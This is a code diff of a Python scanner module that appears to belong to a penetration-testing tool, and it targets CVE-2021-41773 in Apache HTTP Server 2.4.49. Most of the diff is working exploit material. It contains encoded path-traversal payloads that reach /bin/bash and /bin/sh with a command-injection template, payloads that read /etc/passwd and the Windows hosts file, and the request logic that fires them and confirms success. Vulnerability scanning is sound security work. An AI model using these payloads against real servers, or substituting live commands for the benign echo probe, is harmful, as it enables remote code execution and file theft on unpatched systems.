@@ -1,81 +1,98 @@
 #!/usr/bin/env python3
 # -*- coding:utf-8 -*-
 
-from lib.tool.logger import logger
+from lib.tool.md5 import random_md5
 from lib.tool import check
-from thirdparty import requests
-from time import sleep
-import re
 
-def cve_2021_41773_scan(self, url):
+cve_2021_41773_payloads = [
+    {
+        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash',
+        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
+    },
+    {
+        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash',
+        'data': 'echo;{RCECOMMAND}'
+    },
+    {
+        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash',
+        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
+    },
+    {
+        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
+        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
+    },
+    {
+        'path': 'cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
+        'data': 'echo;{RCECOMMAND}'
+    },
+    {
+        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh',
+        'data': 'echo Content-Type: text/plain; echo; {RCECOMMAND}'
+    },
+    # * 无法RCE, 只能FileRead
+    {
+        'path': 'icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+        'data': None
+    },
+    {
+        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+        'data': None
+    },
+    {
+        'path': 'icons/.%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
+        'data': None
+    },
+    {
+        'path': '.%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
+        'data': None
+    },
+]
+
+def cve_2021_41773_scan(self, clients):
     ''' 在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷,
         攻击者可以使用路径遍历攻击将URL映射到网站根目录预期之外的文件
             在特定情况下, 攻击者可构造恶意请求执行系统命令
     '''
-    vul_info = {}
-    vul_info['app_name'] = self.app_name
-    vul_info['vul_type'] = 'RCE/FileRead'
-    vul_info['vul_id'] = 'CVE-2021-41773'
-    # vul_info['vul_method'] = 'GET/POST'
-    vul_info['headers'] = {}
+    hackClient = clients.get('hackClient')
+    
+    vul_info = {
+        'app_name': self.app_name,
+        'vul_type': 'RCE/FileRead',
+        'vul_id': 'CVE-2021-41773',
+    }
 
-    # headers = self.headers.copy()
-    # headers.update(vul_info['headers'])
-
-    for payload in self.cve_2021_41773_payloads:
+    for payload in cve_2021_41773_payloads:
         path = payload['path']
         data = payload['data']
-        target = url + path
+        random_str = random_md5(6)                      # * 随机6位字符串
 
-        vul_info['path'] = path
-        vul_info['data'] = data
-        vul_info['target'] = target
-
-        try:
-            if data:
-                method = 'POST'
-            else:
-                method = 'GET'
-
-            req = requests.Request(
-                method=method,
-                url=target,
+        if data:                                        # * 有POST数据则RCE, 否则为FileRead
+            RCEcommand = 'echo ' + random_str
+            data = data.format(RCECOMMAND=RCEcommand)
+            
+            res = hackClient.request(
+                'post',
+                path,
                 data=data,
-                headers=self.headers
-            ).prepare()
-
-            req.url = target
-            session = requests.session()
-
-            res = session.send(
-                req, 
-                timeout=self.timeout, 
-                proxies=self.proxies, 
-                verify=False,
-                allow_redirects=False
+                vul_info=vul_info
             )
-            logger.logging(vul_info, res.status_code, res)                        # * LOG
+        else:
+            res = hackClient.request(
+                'get',
+                path,
+                vul_info=vul_info
+            )
+        if res is None:
+            continue
 
-
-            # todo 判断
-            if ((self.md in check.check_res(res.text, self.md))
-                or re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
-                or (('Microsoft Corp' in res.text) 
-                    and ('Microsoft TCP/IP for Windows' in res.text))
-            ):
-                results = {
-                    'Target': target,
-                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
-                    'Request': res
-                }
-                return results
-
-        except requests.ConnectTimeout:
-            logger.logging(vul_info, 'Timeout')
-            return None
-        except requests.ConnectionError:
-            logger.logging(vul_info, 'Faild')
-            return None
-        except:
-            logger.logging(vul_info, 'Error')
-            return None
+        if (
+            (check.check_res(res.text, random_str))
+            or (check.check_res_fileread(res.text))
+        ):
+            results = {
+                'Target': res.url,
+                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
+                'Request': res
+            }
+            return results
+    return None
